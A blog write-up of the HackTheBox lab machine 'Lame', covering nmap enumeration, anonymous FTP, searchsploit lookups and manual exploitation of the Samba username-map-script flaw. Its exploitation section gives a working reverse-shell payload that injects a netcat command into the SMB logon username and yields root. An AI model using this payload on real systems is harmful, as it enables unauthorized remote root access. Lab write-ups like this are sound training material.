---
layout: post
title:  "HackTheBox - Lame Writeup"
categories: [HackTheBox]
tags: [pentesting]
draft: false
---

# Introduction

This is a writeup for the machine "Lame" (10.10.10.3) on the platform HackTheBox. HackTheBox is a pentetration testing labs platform so aspiring pen-testers & pen-testers can practice their hacking skills in a variety of different scenarios.

## Enumeration

### NMAP

The first thing we're going to do is run an NMAP scan using the following command `nmap -sV -sC -Pn -oX /tmp/webmap/lame.xml 10.10.10.3` if you're wondering about the last flag `-oX` that is allowing me to output the report into an XML format, this is because I use webmap (as you can see in the /tmp/webmap) which is an awesome tool that allows me some visual aids for a box/network!

```
linxz@linxzsec:~/Documents/Hacking/HTB/Boxes/Retired/Lame$ nmap -sV -sC -Pn -oX /tmp/webmap/lame.xml 10.10.10.3

Starting Nmap 7.60 ( https://nmap.org ) at 2019-01-28 03:04 GMT
Nmap scan report for 10.10.10.3
Host is up (0.026s latency).
Not shown: 996 filtered ports
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 10.10.14.2
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey:
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery:
|   OS: Unix (Samba 3.0.20-Debian)
|   NetBIOS computer name:
|   Workgroup: WORKGROUP\x00
|_  System time: 2019-01-24T19:05:12-05:00
|_smb2-time: Protocol negotiation failed (SMB2)
```

As you can see, we have a few ports open here, however, ftp grabs my attention straight away as we have a line `ftp-anon: Anonymous FTP login allowed (FTP code 230)` this basically means we can login with the username `anonymous` and pretty much any password, so let's try logging in with FTP and seeing what we can find.

### FTP

In order to login anonymously we can just use `ftp 10.10.10.3` then we will be prompted for a username, it is important you use `anonymous` as the username and you can just press enter for the password.

```
linxz@linxzsec:~/Documents/Hacking/HTB/Boxes/Retired/Lame$ ftp 10.10.10.3
Connected to 10.10.10.3.
220 (vsFTPd 2.3.4)
Name (10.10.10.3:linxz): anonymous
331 Please specify the password.
Password:
230 Login successful.
```  

As you can see we can login just fine with this, now let's take a look around and try to find some files, etc. Firslty we'll do a pwd to see where we are on the file system and see if we have any files in our current directory.

```
ftp>
ftp> pwd
257 "/"
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        65534        4096 Mar 17  2010 .
drwxr-xr-x    2 0        65534        4096 Mar 17  2010 ..
226 Directory send OK.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        65534        4096 Mar 17  2010 .
drwxr-xr-x    2 0        65534        4096 Mar 17  2010 ..
226 Directory send OK.
```

So, looks like this is pretty empty so I guess this is not the correct attack route I suppose. So we'll focus on the Samba side of things now, it is worth noting, that vsFTPD 2.3.4 has a backdoor vulnerability, I did not mention this before but if you use `searchsploit` and `vsftpd 2.3.4` you will see the vulnerability I am talking about.

```
linxz@linxzsec:/opt/exploitdb$ ./searchsploit vsftpd 2.3.4
------------------------------------------------------------------------------------------------------------------- ----------------------------------
 Exploit Title                                                                                                     |  Path
                                                                                                                   | (/opt/exploitdb/)
------------------------------------------------------------------------------------------------------------------- ----------------------------------
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                                                             | exploits/unix/remote/17491.rb
------------------------------------------------------------------------------------------------------------------- ----------------------------------
```

However, what we just attempted is basically doing exactly what the Metasploit module would do so we don't need to use the Metasploit module. The point is, it is always a good habit to do a Searchsploit on the versions of software.

### Samba

We know that Samba is running so let's try to attack this - as I mentioned it is always a good idea to use Searchsploit on version numbers you get, in this case from our nmap scan we know that the version is `3.0.20-Debian` so we'll do a Searchsploit on this, dropping the `debian` though else Searchsploit might not find it.

```
linxz@linxzsec:/opt/exploitdb$ ./searchsploit samba 3.0.20
------------------------------------------------------------------------------------------------------------------- ----------------------------------
 Exploit Title                                                                                                     |  Path
                                                                                                                   | (/opt/exploitdb/)
------------------------------------------------------------------------------------------------------------------- ----------------------------------
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)                                   | exploits/unix/remote/16320.rb
Samba < 3.0.20 - Remote Heap Overflow                                                                              | exploits/linux/remote/7701.txt
```

There also appears to be a Remote Heap Overflow here however, we won't try that unless the Username map script does not work, this is because it will be a little harder to actually exploit so we'll stick with the "Username Map Script" exploit first. Interetingly, I already knew about this exploit as I [made a post](https://linxz.co.uk/vulnerabilities/2018/11/14/Samba-username-map-script.html) about it previously.

## Exploitation

So, it looks like this box is vulnerable to CVE2007-2447. Let's exploit this, however, we're not going to use Metasploit as this is really easy to exploit manually and will help us with concepts such as reverse shells & just getting used to the exploitation process if we don't have Metasploit available.

Firstly we need to see what shares are available, we can do this using `smbclient -L //10.10.10.3/`

```
linxz@linxzsec:~/Documents/Hacking/HTB/Boxes/Retired/Lame$ smbclient -L //10.10.10.3/tmp
WARNING: The "syslog" option is deprecated
Enter WORKGROUP\linxz's password: 
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	tmp             Disk      oh noes!
	opt             Disk
	IPC$            IPC       IPC Service (lame server (Samba 3.0.20-Debian))
	ADMIN$          IPC       IPC Service (lame server (Samba 3.0.20-Debian))
Reconnecting with SMB1 for workgroup listing.
Anonymous login successful

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------
	WORKGROUP            LAME
```

As you can see in the above, we have `opt` & `tmp` let's try and connect to `tmp` with an anonymous login, in order to do this you can just use `smblclient //10.10.10.3/tmp` and hit enter to send a blank password.

```
linxz@linxzsec:~/Documents/Hacking/HTB/Boxes/Retired/Lame$ smbclient //10.10.10.3/tmp
WARNING: The "syslog" option is deprecated
Enter WORKGROUP\linxz's password:
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \>
```

Now that we've logged into the share, we want to actually exploit this vulnerability, if you want to understand how it works you can go and read my post that I linked earlier as I'm not going to explain the exploit here.

So firstly we're going to use netcat to create a listener on our device, this can be done with `nc -nvlp 4444` once we have the listener running we're going to send the following payload into the device.

```
smb: \> logon "./=`nohup nc 10.10.14.2 4444 -e /bin/bash`"
Password:
```

If you hit enter at the password prompt you should then see a connection back into your listener, you now have a shell! It is time for privilege escalation! Well, usually it would be time for privilege escalation however we actually get a root account straight away on this box so we don't need to do any kind of privilege escalation.

```
linxz@linxzsec:~/Documents/Hacking/HTB/Boxes/Retired/Lame$ netcat -nvlp 4444
Listening on [0.0.0.0] (family 0, port 4444)
Connection from 10.10.10.3 43316 received!
whoami
root
```

Now we can just go and get the user flag from the users desktop and the root flag, submit them and we're done with the box! As I said, if you'd like to understand how the exploit works a little more you can go and read my post on it!
